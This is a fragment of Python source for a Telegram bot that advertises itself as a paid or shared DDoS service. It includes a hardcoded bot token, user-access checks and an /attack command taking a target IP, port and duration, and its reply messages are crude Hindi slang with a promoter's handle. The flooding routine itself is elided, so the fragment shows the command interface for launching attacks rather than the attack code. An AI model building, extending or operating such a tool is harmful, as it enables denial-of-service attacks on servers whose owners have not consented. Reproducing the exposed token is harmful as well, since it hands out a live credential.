...
TELEGRAM_BOT_TOKEN = '7861458890:AAELMEzs-xr0C57SF1Z7s9NYSaQOdXMfwVs'
...
async def start(update: Update, context: CallbackContext):
    ...
    if not await is_user_allowed(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*access kon tera baap lega lode @ansardildos! /get_id*", parse_mode='Markdown')
        return
    message = (
        "*WELCOME 🤗 TO VIKKU BHAI DDOS  *\n\n"
        "*💀Use /attack <ip> <port> <duration>*\n"
        "*💀sever ki chudayi @vikkudildosfree 🚀*" 
    )
...
async def attack(update: Update, context: CallbackContext):
    ...
    user_id = update.effective_user.id
    if not await is_user_allowed(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*access kon tera baap lega lode @ansardildos!*", parse_mode='Markdown')
        return
    args = context.args
    if len(args) != 3:
    ...
    text=(
        ...
        f"*🔥chudai chalu h feedback bhej dena @vikkudildosfree💥*"
    ), parse_mode='Markdown')
